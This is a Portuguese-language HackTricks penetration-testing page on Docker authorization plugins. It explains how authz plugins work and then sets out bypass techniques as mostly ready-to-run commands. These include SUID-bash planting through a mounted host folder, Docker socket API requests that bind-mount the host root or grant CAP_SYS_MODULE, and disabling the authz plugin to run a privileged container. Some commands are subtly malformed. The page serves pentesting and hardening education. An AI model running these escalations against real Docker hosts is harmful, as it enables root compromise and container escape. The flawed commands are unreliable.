<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


O modelo de **autorização** padrão do **Docker** é **tudo ou nada**. Qualquer usuário com permissão para acessar o daemon do Docker pode **executar qualquer** comando do cliente do Docker. O mesmo é verdadeiro para chamadas que usam a API do Engine do Docker para entrar em contato com o daemon. Se você precisar de **maior controle de acesso**, pode criar **plugins de autorização** e adicioná-los à configuração do daemon do Docker. Usando um plugin de autorização, um administrador do Docker pode **configurar políticas de acesso granulares** para gerenciar o acesso ao daemon do Docker.

# Arquitetura básica

Os plugins de autenticação do Docker são **plugins externos** que você pode usar para **permitir/negar** **ações** solicitadas ao daemon do Docker **dependendo** do **usuário** que solicitou e da **ação** **solicitada**.

Quando uma **solicitação HTTP** é feita ao daemon do Docker através da CLI ou via API do Engine, o **subsystem de autenticação** **passa** a solicitação para o(s) **plugin(s) de autenticação** instalado(s). A solicitação contém o usuário (chamador) e o contexto do comando. O **plugin** é responsável por decidir se deve **permitir** ou **negar** a solicitação.

Os diagramas de sequência abaixo mostram um fluxo de autorização permitido e negado:

![Fluxo de autorização permitido](https://docs.docker.com/engine/extend/images/authz\_allow.png)

![Fluxo de autorização negado](https://docs.docker.com/engine/extend/images/authz\_deny.png)

Cada solicitação enviada ao plugin **inclui o usuário autenticado, os cabeçalhos HTTP e o corpo da solicitação/resposta**. Apenas o **nome do usuário** e o **método de autenticação** usado são passados para o plugin. Mais importante ainda, **nenhuma** credencial ou token de usuário é passado. Finalmente, **nem todos os corpos de solicitação/resposta são enviados** para o plugin de autorização. Apenas aqueles corpos de solicitação/resposta em que o `Content-Type` é `text/*` ou `application/json` são enviados.

Para comandos que podem potencialmente sequestrar a conexão HTTP (`HTTP Upgrade`), como `exec`, o plugin de autorização é chamado apenas para as solicitações HTTP iniciais. Uma vez que o plugin aprova o comando, a autorização não é aplicada ao restante do fluxo. Especificamente, os dados de streaming não são passados para os plugins de autorização. Para comandos que retornam resposta HTTP fragmentada, como `logs` e `events`, apenas a solicitação HTTP é enviada para os plugins de autorização.

Durante o processamento de solicitação/resposta, alguns fluxos de autorização podem precisar fazer consultas adicionais ao daemon do Docker. Para completar esses fluxos, os plugins podem chamar a API do daemon como um usuário regular. Para habilitar essas consultas adicionais, o plugin deve fornecer os meios para um administrador configurar políticas de autenticação e segurança adequadas.

## Vários plugins

Você é responsável por **registrar** seu **plugin** como parte da **inicialização** do daemon do Docker. Você pode instalar **múltiplos plugins e encadeá-los**. Esta cadeia pode ser ordenada. Cada solicitação ao daemon passa em ordem pela cadeia. Somente quando **todos os plugins concedem acesso** ao recurso, o acesso é concedido.

# Exemplos de plugins

## Twistlock AuthZ Broker

O plugin [**authz**](https://github.com/twistlock/authz) permite que você crie um arquivo **JSON** simples que o **plugin** irá **ler** para autorizar as solicitações. Portanto, ele lhe dá a oportunidade de controlar muito facilmente quais endpoints da API cada usuário pode alcançar.

Este é um exemplo que permitirá que Alice e Bob possam criar novos containers: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

Na página [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go), você pode encontrar a relação entre a URL solicitada e a ação. Na página [types.go](https://github.com/twistlock/authz/blob/master/core/types.go), você pode encontrar a relação entre o nome da ação e a ação.

## Tutorial de plugin simples

Você pode encontrar um **plugin fácil de entender** com informações detalhadas sobre instalação e depuração aqui: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

Leia o `README` e o código `plugin.go` para entender como ele funciona.

# Bypass de plugin de autenticação do Docker

## Enumerar acesso

As principais coisas a verificar são **quais endpoints são permitidos** e **quais valores de HostConfig são permitidos**.

Para realizar esta enumeração, você pode **usar a ferramenta** [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**.**

## `run --privileged` não permitido

### Privilégios mínimos
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### Executando um contêiner e obtendo uma sessão privilegiada

Neste caso, o sysadmin **proibiu que os usuários montem volumes e executem contêineres com a flag `--privileged` ou concedam qualquer capacidade extra ao contêiner:**
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
No entanto, um usuário pode **criar um shell dentro do contêiner em execução e conceder privilégios extras a ele**:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
Agora, o usuário pode escapar do contêiner usando qualquer uma das [**técnicas discutidas anteriormente**](./#privileged-flag) e **elevar privilégios** dentro do host.

## Montar pasta gravável

Neste caso, o sysadmin **proibiu que os usuários executem contêineres com a flag `--privileged`** ou concedam qualquer capacidade extra ao contêiner, e permitiu apenas a montagem da pasta `/tmp`:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
 -p #This will give you a shell as root
```
{% hint style="info" %}
Observe que talvez você não possa montar a pasta `/tmp`, mas pode montar uma **pasta gravável diferente**. Você pode encontrar diretórios graváveis usando: `find / -writable -type d 2>/dev/null`

**Observe que nem todos os diretórios em uma máquina Linux suportarão o bit suid!** Para verificar quais diretórios suportam o bit suid, execute `mount | grep -v "nosuid"`. Por exemplo, geralmente `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` e `/var/lib/lxcfs` não suportam o bit suid.

Observe também que se você puder **montar `/etc`** ou qualquer outra pasta **contendo arquivos de configuração**, poderá alterá-los do contêiner docker como root para **abusá-los no host** e escalar privilégios (talvez modificando `/etc/shadow`).
{% endhint %}

## Endpoint de API não verificado

A responsabilidade do sysadmin que configura este plugin seria controlar quais ações e com quais privilégios cada usuário pode executar. Portanto, se o administrador adotar uma abordagem de **lista negra** com os endpoints e os atributos, ele pode **esquecer alguns deles** que poderiam permitir que um invasor **escalasse privilégios**.

Você pode verificar a API do docker em [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)

## Estrutura JSON não verificada

### Vinculações na raiz

É possível que, ao configurar o firewall do docker, o sysadmin tenha **esquecido algum parâmetro importante** da [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) como "**Binds**".\
No exemplo a seguir, é possível abusar dessa configuração incorreta para criar e executar um contêiner que monta a pasta raiz (/) do host:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
{% hint style="warning" %}
Observe que neste exemplo estamos usando o parâmetro **`Binds`** como uma chave de nível raiz no JSON, mas na API ele aparece sob a chave **`HostConfig`**
{% endhint %}

### Binds em HostConfig

Siga as mesmas instruções como em **Binds em root** realizando esta **solicitação** para a API do Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### Montagens na raiz

Siga as mesmas instruções que com **Vínculos na raiz** realizando esta **solicitação** para a API do Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### Montagens em HostConfig

Siga as mesmas instruções que com **Vínculos em root** realizando esta **solicitação** à API do Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## Atributo JSON não verificado

É possível que quando o sysadmin configurou o firewall do docker, ele **tenha esquecido de algum atributo importante de um parâmetro da [API](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)**, como "**Capabilities**" dentro de "**HostConfig**". No exemplo a seguir, é possível abusar dessa má configuração para criar e executar um contêiner com a capacidade **SYS\_MODULE**:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
{% hint style="info" %}
O **`HostConfig`** é a chave que geralmente contém os **privilégios** **interessantes** para escapar do contêiner. No entanto, como discutimos anteriormente, observe como o uso de Binds fora dele também funciona e pode permitir que você contorne as restrições.
{% endhint %}

## Desativando o Plugin

Se o **sysadmin** **esqueceu** de **proibir** a capacidade de **desativar** o **plugin**, você pode aproveitar isso para desativá-lo completamente!
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
Lembre-se de **reativar o plugin após a escalada**, caso contrário, uma **reinicialização do serviço do Docker não funcionará**!

## Writeups de Bypass do Plugin de Autenticação

* [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

# Referências

* [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
